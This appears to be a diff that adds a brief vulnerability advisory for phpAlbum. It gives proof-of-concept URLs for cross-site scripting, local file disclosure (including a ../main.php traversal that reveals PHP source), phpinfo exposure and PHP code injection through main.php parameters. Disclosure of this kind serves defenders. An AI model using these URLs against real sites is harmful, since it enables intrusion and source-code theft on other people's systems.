@@ -1,0 +1,62 @@
+
+
++-----------------------+
+| Cross Site scripting  |
++-----------------------+
+
+The vulnerable code is located in /www/main.php?cmd=imageview&var1=[XSS]
+
+
+Proof of Concept:
+-----------------
+
+
+~ PoC : http://www.example.com/phpAlbum/main.php?cmd=imageview&var1=[XSS]
+
+~ Poc 2
+
+http://www.example.com/phpAlbum/main.php?cmd=albumnew&keyword=[XSS]
+
++----------------------+
+| Download/Source Code |
++----------------------+
+
+The vulnerable code is located in /www/main.php
+
+Proof of Concept:
+-----------------
+
+~ PoC : http://www.example.com/phpAlbum/main.php?cmd=image&var1=[LFD]
+
+~ PoC : http://www.example.com/phpAlbum/main.php?cmd=image&var1=../main.php
+
+~ PoC 2 : http://www.example.com/main.php?cmd=themeimage&var1=[LFD]
+
+# Important Notes:
+
+Php files from source to display (Veiw Page Source) your browser
+
+
++--------------------+
+| PHP Code Injection |
++--------------------+
+
+The vulnerable code is located in /www/main.php
+
+124 :       Array
+125 :       (
+126 :              [0] => cmd=phpinfo
+127 :        )
+
+
+Proof of Concept:
+-----------------
+
+~ PoC : http://www.example.com/phpAlbum/main.php?cmd=phpinfo
+
+~ PoC : http://www.example.com/demo3/main.php?keyword=hack&cmd=phpinfo
+
+~ PoC 2 http://www.example.com/main.php?cmd=setquality&var1=[PHP Code Injection]
+
+
+
